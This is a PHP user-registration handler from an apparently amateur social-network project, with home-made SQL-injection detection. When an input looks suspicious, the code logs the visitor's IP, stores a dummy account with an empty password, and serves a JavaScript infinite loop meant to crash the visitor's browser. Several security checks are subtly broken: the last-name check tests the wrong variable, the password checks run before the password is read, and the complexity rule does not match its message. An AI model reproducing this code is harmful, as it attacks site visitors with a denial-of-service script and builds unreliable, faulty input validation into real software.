<?php
include("sqli.php");

// Variable declaration -> Error Prevention.
$ip = "";
$fname = ""; // First Name.
$lname = ""; // Last Name.
$em = ""; // Email.
$em2 = ""; // Email2.
$password = ""; // Password.
$password2 = ""; // Password2.
$date = ""; // Sign up date.
$error_array = array(); // Holds error messages.

// Conditional: Handles the user pressing the register button.
if (isset($_POST['register_button'])) {

	// First Name.
	$fname = strip_tags($_POST['reg_fname']); // Remove html tags.
	$fname = str_replace(' ', '', $fname); //Remove spaces.
	$fname = ucfirst(strtolower($fname)); // Ensures only the first letter is capitalized.
	if (sqlIClear($fname)) {
		$_SESSION['reg_fname'] = $fname; // Stores first name into session variable.
	} else {
		$ip = getUserIP();
		$fname = "";
	}

	// Last Name.
	$lname = strip_tags($_POST['reg_lname']); // Remove html tags.
	$lname = str_replace(' ', '', $lname); //Remove spaces.
	$lname = ucfirst(strtolower($lname)); // Ensures only the first letter is capitalized.
	if (sqlIClear($fname)) {
		$_SESSION['reg_lname'] = $lname; // Stores last name into session variable.
	} else {
		$ip = getUserIP();
		$lname = "";
	}

	// Email.
	$em = strip_tags($_POST['reg_email']); // Remove html tags.
	$em = str_replace(' ', '', $em); //Remove spaces.
	$em = ucfirst(strtolower($em)); // Ensures only the first letter is capitalized.
	if (sqlIClear($em)) {
		$_SESSION['reg_email'] = $em; // Stores email into session variable.
	} else {
		$ip = getUserIP();
		$em = "";
	}

	// Email2.
	$em2 = strip_tags($_POST['reg_email2']); // Remove html tags.
	$em2 = str_replace(' ', '', $em2); //Remove spaces.
	$em2 = ucfirst(strtolower($em2)); // Ensures only the first letter is capitalized.
	if (sqlIClear($em2)) {
		$_SESSION['reg_email2'] = $em2; // Stores email2 into session variable.
	} else {
		$ip = getUserIP();
		$em2 = "";
	}

	// Password.
	if (sqlIClear($password)) {
		$password = strip_tags($_POST['reg_password']); // Remove html tags.
	} else {
		$ip = getUserIP();
		$password = "";
	}

	// Password2.
	if (sqlIClear($password)) {
		$password2 = strip_tags($_POST['reg_password2']); // Remove html tags.
	} else {
		$ip = getUserIP();
		$password2 = "";
	}

	// Email handlings
	if ($em == $em2) {
		// Check if email is in valid format.
		if (filter_var($em, FILTER_VALIDATE_EMAIL)) {

			$em = filter_var($em, FILTER_VALIDATE_EMAIL);

			// Check if email already exists.
			$stmt = $mysqli->prepare("SELECT email FROM users WHERE email =?");
			$stmt->bind_param("s", $em);
			$stmt->execute();
			// Count number of rows returned.
			$result = $stmt->get_result();
			if ($result->num_rows > 0) {
				array_push($error_array, "That email is already in use.<br>");
			}
		} else {
			array_push($error_array, "Invalid email format.<br>");
		}
	} else {
		array_push($error_array, "Your emails do not match.<br>");
	}

	// First name handling.
	if ($ip == "" && (strlen($fname) > 25 || strlen($fname) < 2)) {
		array_push($error_array, "Your first name must be between 2 and 25 characters.<br>");
	}

	// Last name handling.
	if ($ip == "" && (strlen($lname) > 25 || strlen($lname) < 2)) {
		array_push($error_array, "Your last name must be between 2 and 25 characters.<br>");
	}

	// Password strength handling.
	if ($ip == "" && ($password != $password2)) {
		array_push($error_array, "Your passwords do not match.<br>");
	} else if ($ip == "") {
		if (!preg_match('/^(?=(.*[a-z]){1,})(?=(.*[\d]){1,})(?=(.*[\W]){1,})(?!.*\s).{10,}$/', $password)) {
			array_push($error_array, "Your password must contain at least: 1 lower case letter, 1 upper case letter, 1 number, and 1 symbol.<br>");
		}
		if (strlen($password) < 10) {
			array_push($error_array, "Your password must contain at least 10 characters.<br>");
		}
	}

	// Registration Date.
	$date = date("Y-m-d"); // Pulls current date.

	// Crash Browser and save Ip address if sqli attempted.
	if ($ip != "") {
		$password = "";
		// Generate user name by concatenating first and last name.
		$username = strtolower($fname . "_" . $lname);

		$stmt = $mysqli->prepare("SELECT username FROM users WHERE username = ?");
		$stmt->bind_param("s", $username);
		$stmt->execute();
		$result = $stmt->get_result();

		// If username exists, add number to username.
		$i = 0;
		while ($result->num_rows != 0) {
			$i++; // Increment i.
			$username = strtolower($fname . "_" . $lname);
			$username = $username . "_" . $i;
			$stmt->bind_param("s", $username);
			$stmt->execute();
			$result = $stmt->get_result();
		}

		// Profile picture default assaignment.
		$profile_pic = "";

		// Inserts user data into database.
		$user_id = ''; // Database auto-increments.
		$num_posts = 0; // Initial value.
		$num_likes = 0; // Initial value.
		$user_closed = 'no'; // Account is not closed.
		$friend_array = ','; // Initial Setting for friend list.

		$stmt = $mysqli->prepare("INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
		$stmt->bind_param("sssssssssssss", $user_id, $fname, $lname, $username, $em, $password, $date, $profile_pic, $num_posts, $num_likes, $user_closed, $friend_array, $ip);
		$stmt->execute();
		$stmt->close();
		//$query = mysqli_query($con, "INSERT INTO users VALUES ('', '$fname', '$lname', '$username', '$em', '$password', '$date', '$profile_pic', '0', '0', 'no', ',')");

		// Clear session variables.
		$_SESSION['reg_fname'] = "";
		$_SESSION['reg_lname'] = "";
		$_SESSION['reg_email'] = "";
		$_SESSION['reg_email2'] = "";

		// Email user's ip address string.
		//mail("bluejacensolo@aol.com","Hack Attempt!",$ip);

		// Script to crash browser
		?>
		<script>
			while (true) {
				var dp = document.getElementByID("spamr");
				if (!document.getElementByID("spamr")) {
					var dp = document.createElementByID("spamr");
					dp.innerHTML += "🤍🤍🤍🤍🤍🤍🤍🤍🤍🤍";
				}
				dp.innerHTML += "🤍🤍🤍🤍🤍🤍🤍🤍🤍🤍🤍";
			}
		</script>
		<?php
	}


	// Pushes user data into the database.
	if (empty($error_array)) {
		$password = password_hash($password, PASSWORD_DEFAULT); // Encrypts password: Hashing algorithm requires PHP 5.5.0 or newer.

		// Generate user name by concatenating first and last name.
		$username = strtolower($fname . "_" . $lname);

		$stmt = $mysqli->prepare("SELECT username FROM users WHERE username = ?");
		$stmt->bind_param("s", $username);
		$stmt->execute();
		$result = $stmt->get_result();

		// If username exists, add number to username.
		$i = 0;
		while ($result->num_rows != 0) {
			$i++; // Increment i.
			$username = strtolower($fname . "_" . $lname);
			$username = $username . "_" . $i;
			$stmt->bind_param("s", $username);
			$stmt->execute();
			$result = $stmt->get_result();
		}

		// Profile picture default assaignment.
		$rand = rand(1, 10); // Creates a random number between 1 and 10 (inclusive).
		if ($rand == 1) {
			$profile_pic = "assets/images/profile_pic/defaults/head_deep_blue.png";
		} else if ($rand == 2) {
			$profile_pic = "assets/images/profile_pic/defaults/head_emerald.png";
		} else if ($rand == 3) {
			$profile_pic = "assets/images/profile_pic/defaults/head_alizarin.png";
		} else if ($rand == 4) {
			$profile_pic = "assets/images/profile_pic/defaults/head_amethyst.png";
		} else if ($rand == 5) {
			$profile_pic = "assets/images/profile_pic/defaults/head_carrot.png";
		} else if ($rand == 6) {
			$profile_pic = "assets/images/profile_pic/defaults/head_green_sea.png";
		} else if ($rand == 7) {
			$profile_pic = "assets/images/profile_pic/defaults/head_nephritis.png";
		} else if ($rand == 8) {
			$profile_pic = "assets/images/profile_pic/defaults/head_pete_river.png";
		} else if ($rand == 9) {
			$profile_pic = "assets/images/profile_pic/defaults/head_pomegranate.png";
		} else if ($rand == 10) {
			$profile_pic = "assets/images/profile_pic/defaults/head_red.png";
		}

		// Inserts user data into database.
		$user_id = ''; // Database auto-increments.
		$num_posts = 0; // Initial value.
		$num_likes = 0; // Initial value.
		$user_closed = 'no'; // Account is not closed.
		$friend_array = ','; // Initial Setting for friend list.

		$stmt = $mysqli->prepare("INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
		$stmt->bind_param("sssssssssssss", $user_id, $fname, $lname, $username, $em, $password, $date, $profile_pic, $num_posts, $num_likes, $user_closed, $friend_array, $ip);
		$stmt->execute();
		$stmt->close();
		//$query = mysqli_query($con, "INSERT INTO users VALUES ('', '$fname', '$lname', '$username', '$em', '$password', '$date', '$profile_pic', '0', '0', 'no', ',')");

		// Outputs confirmation message.
		array_push($error_array, "<span style = 'color: #14C800;'> You're all set! Go ahead and login!</span><br>");

		// Clear session variables.
		$_SESSION['reg_fname'] = "";
		$_SESSION['reg_lname'] = "";
		$_SESSION['reg_email'] = "";
		$_SESSION['reg_email2'] = "";
	}

}
?>